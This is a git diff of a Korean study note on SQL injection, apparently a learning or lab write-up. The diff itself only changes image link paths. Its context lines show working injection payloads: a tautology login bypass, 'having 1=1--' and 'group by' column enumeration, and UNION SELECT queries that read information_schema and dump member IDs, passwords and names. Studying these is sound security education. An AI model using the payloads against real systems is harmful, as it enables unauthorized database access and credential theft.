@@ -30,8 +30,8 @@ true'or3=3--
 
 DB 스키마/테이블 값 조회 화면 예시:
 
-![](Images/Pasted%20image%2020260729174725.png)  
-![160](Images/Pasted%20image%2020260729174750.png)
+![](../Images/Pasted%20image%2020260729174725.png)  
+![160](../Images/Pasted%20image%2020260729174750.png)
 
 ---
 
@@ -50,7 +50,7 @@ group by ~--
 - `having 1=1--`: 숨겨진 컬럼 값(예: `chapter1.idx`)이 드러나면서 순차적으로 정보에 접근 가능
 - `group by ~--`: 이런 식으로 계속 트래킹하다 보면 `chapter1.level_idx`, `chapter1.ref_idx` 등 여러 컬럼 데이터 값을 확인할 수 있음
 
-![](Images/Pasted%20image%2020260729175036.png)
+![](../Images/Pasted%20image%2020260729175036.png)
 
 
 ---
@@ -84,7 +84,7 @@ MySQL, MSSQL 등에서는 `information_schema` DB에 전체 DB 정보(테이블/
 UNION SELECT 1,2,3,table_name,column_name,NULL,NULL FROM information_schema.columns--
 ```
 
-![](Images/Pasted%20image%2020260729162837.png)
+![](../Images/Pasted%20image%2020260729162837.png)
 
 
 **특정 테이블(member)의 컬럼명만 조회**
@@ -93,7 +93,7 @@ UNION SELECT 1,2,3,table_name,column_name,NULL,NULL FROM information_schema.colu
 UNION SELECT 1,2,3,column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name = 'member'--
 ```
 
-![](Images/Pasted%20image%2020260729162744.png)
+![](../Images/Pasted%20image%2020260729162744.png)
 
 
 **실제 데이터 조회 (member 테이블)**
@@ -103,7 +103,7 @@ UNION SELECT 1,2,3,column_name,NULL,NULL,NULL FROM information_schema.columns WH
 UNION SELECT 1,2,3,m_id,m_pwd,m_name,NULL,NULL FROM member--
 ```
 
-![](Images/Pasted%20image%2020260729163310.png)
+![](../Images/Pasted%20image%2020260729163310.png)
 
 
 ---
